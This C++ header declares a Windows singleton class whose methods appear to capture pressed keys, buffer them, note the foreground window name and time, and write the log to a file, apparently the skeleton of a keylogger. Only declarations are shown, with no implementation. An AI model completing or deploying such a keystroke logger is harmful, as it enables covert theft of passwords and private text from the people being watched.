#pragma once
#include "Singleton.hpp"
#include <fstream>
#include <string>
#include <Windows.h>
#include <optional>
class InputHandler : public Singleton<InputHandler> {
public:
	InputHandler() {};
	~InputHandler() {};
	static std::string GetDirectoryToFile();
	void GetPressedChar();
	void printToFile(const char* directory);	
	static std::pair<int, int>GetTimeHM(int seconds);
	std::optional<std::string>GetForegroundWindowName();
private:
	std::string buffer;
	std::string temporaryBuffer;
};